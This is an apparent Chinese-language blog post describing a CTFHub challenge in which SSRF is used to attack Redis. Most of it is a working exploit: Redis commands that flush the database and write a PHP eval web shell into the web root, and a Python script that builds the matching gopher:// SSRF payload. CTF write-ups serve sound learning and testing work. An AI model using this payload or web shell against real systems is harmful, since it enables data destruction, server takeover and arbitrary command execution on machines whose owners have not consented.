---
title: CTFHub中SSRF打Redis
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: [SSRF,CTF]
categories: [SSRF,CTF]
---

> Redis相关协议
>
> [Redis配置详解](https://www.redis.com.cn/redis-configuration/)
>
> [浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)

这题进行写文件后执行命令。

Redis命令如下：

```bash
flushall
set 1 '<?php eval($_GET["cmd"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```

这是我是直接拿带佬们的脚本打的，大概看了一下Redis原理与协议还有它的格式，需要找个时间自己动手写一下exp加深印象。

稍微改了一下，能在python3.8跑，原exp应该是在python2环境中执行

```python
from urllib import parse
protocol="gopher://"
ip="192.168.163.128"
port="6379"
shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += parse.quote(redis_format(x))
    print(payload)
```

生成的攻击流量需要再次url编码后才行。

写入一句话之后就可以进行命令执行啦。